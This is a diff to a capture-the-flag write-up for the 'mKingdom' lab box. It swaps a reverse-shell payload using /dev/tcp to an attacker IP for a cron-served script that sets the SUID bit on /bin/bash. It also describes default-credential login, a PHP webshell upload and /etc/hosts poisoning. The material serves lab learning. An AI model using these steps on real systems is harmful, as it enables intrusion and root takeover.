@@ -16,9 +16,11 @@
 | **Target** | `mkingdom.thm` |
 | **OS** | Ubuntu 14.04 |
 | **Attack Surface** | Concrete5 8.5.2 CMS — default credentials, filetype whitelist bypass, PHP webshell |
-| **Privesc** | DB config credential leak → `.bashrc` base64 token → root cron HTTP hijack |
+| **Privesc** | DB config credential leak → `.bashrc` base64 token → root cron HTTP hijack → SUID bash |
 
-mKingdom runs a Concrete5 8.5.2 CMS on a non-standard port, tucked under a nested path. Default admin credentials open the dashboard, and adding `php` to the allowed upload filetypes turns the file manager into a webshell delivery mechanism. Plaintext database credentials in the CMS config pivot to `toad`, a base64-encoded password stashed in `.bashrc` pivots to `mario`, and a root-owned cron job blindly fetching and executing a shell script over HTTP — using a resolvable hostname rather than localhost — is hijacked by serving a malicious replacement from the attacker machine.
+Despite being listed as Easy, mKingdom is firmly Medium in practice. It chains five distinct steps with no hand-holding: a non-standard port, a CMS hidden under a nested path, credential reuse across three different users, and a root privesc that requires recognising a hostname-based HTTP fetch in a cron job and weaponising it via `/etc/hosts` poisoning. Beginners who haven't internalised the full enumeration workflow and lateral movement fundamentals will hit walls at multiple points.
+
+The chain: Concrete5 8.5.2 on port 85 falls to default credentials, an admin-configurable filetype whitelist is extended to allow PHP, and a webshell gives `www-data`. Plaintext database credentials in the CMS config pivot to `toad`, a base64-encoded password buried in `.bashrc` pivots to `mario`, and a root cron job that blindly fetches and executes a script over HTTP — resolved by hostname, not localhost — is hijacked by poisoning `/etc/hosts` and serving a malicious replacement that sets the SUID bit on `/bin/bash`.
 
 ---
 
@@ -225,24 +227,26 @@ echo "192.168.240.231  mkingdom.thm" >> /etc/hosts
 
 ### Serve Malicious counter.sh
 
-On the attacker machine, mirror the expected path:
+On the attacker machine, mirror the path the cron expects and drop a payload that sets the SUID bit on `/bin/bash`:
 
 ```bash
 mkdir -p app/castle/application/
 cat > app/castle/application/counter.sh <<'EOF'
 #!/bin/bash
-bash -i >& /dev/tcp/192.168.240.231/5555 0>&1
+chmod +s /bin/bash
 EOF
 
 sudo python3 -m http.server 85
 ```
 
-```bash
-# listener
-nc -nlvp 5555
-```
+When the cron fires, root fetches and executes the script. `/bin/bash` now has the SUID bit set:
 
-When the cron fires, root fetches the payload and executes it:
+```bash
+ls -la /bin/bash
+# -rwsr-sr-x 1 root root ... /bin/bash
+
+bash -p
+```
 
 ```
 bash-4.3# id
@@ -291,11 +295,11 @@ cp /root/root.txt /tmp && cat /tmp/root.txt
           ▼
 [/etc/hosts Poisoning]
     mkingdom.thm → 192.168.240.231
-    python3 -m http.server 85 → serve malicious counter.sh
+    python3 -m http.server 85 → counter.sh: chmod +s /bin/bash
           │
           ▼
-[Root Shell]
-    uid=0(root) → root.txt
+[SUID bash]
+    bash -p → uid=0(root) → root.txt
 ```
 
 ---
@@ -307,7 +311,7 @@ cp /root/root.txt /tmp && cat /tmp/root.txt
 - CMS config files (`database.php`, `config.php`) almost always hold plaintext credentials — check them immediately post-foothold
 - Environment variables in `.bashrc` are a common credential stash; always inspect them on every lateral pivot
 - Root cron jobs fetching scripts over HTTP by hostname (not `localhost`) are fully exploitable via `/etc/hosts` if the attacker can write to it — `curl <url> | bash` with no integrity check is unconditional trust in the remote
-- Marking a flag file `root:root` doesn't prevent reading once you have root — but it does mean standard user access fails even on world-readable files if parent directory ACLs interfere
+- This box is rated Easy but demands Medium-level thinking: five distinct pivots, zero explicit hints, and a privesc that requires connecting pspy output to `/etc/hosts` writability to a served payload — that's not a beginner chain
 
 ---
 
@@ -320,7 +324,7 @@ cp /root/root.txt /tmp && cat /tmp/root.txt
 | Persistence | Server Software Component: Web Shell | [T1505.003](https://attack.mitre.org/techniques/T1505/003) |
 | Credential Access | Unsecured Credentials: Credentials In Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001) |
 | Privilege Escalation | Scheduled Task/Job: Cron | [T1053.003](https://attack.mitre.org/techniques/T1053/003) |
-| Defense Evasion | Modify Authentication Process | [T1556](https://attack.mitre.org/techniques/T1556) |
+| Privilege Escalation | Abuse Elevation Control Mechanism: Setuid and Setgid | [T1548.001](https://attack.mitre.org/techniques/T1548/001) |
 | Command and Control | Application Layer Protocol: Web Protocols | [T1071.001](https://attack.mitre.org/techniques/T1071/001) |
 
 ---
@@ -333,9 +337,10 @@ cp /root/root.txt /tmp && cat /tmp/root.txt
 | `ffuf` | Directory bruteforce to discover `/app/castle/` |
 | `curl` | Webshell verification and RCE testing |
 | `nc` | Reverse shell listener |
-| `python3 -m http.server` | Serve malicious `counter.sh` to intercept root cron job |
+| `python3 -m http.server` | Serve malicious `counter.sh` (SUID bash payload) to intercept root cron job |
 | `pspy` | Unprivileged process monitoring to discover root cron job |
 | `base64` | Decode `.bashrc` `PWD_token` credential |
+| `bash -p` | Spawn privileged shell after SUID bit set on `/bin/bash` |
 
 ---
 
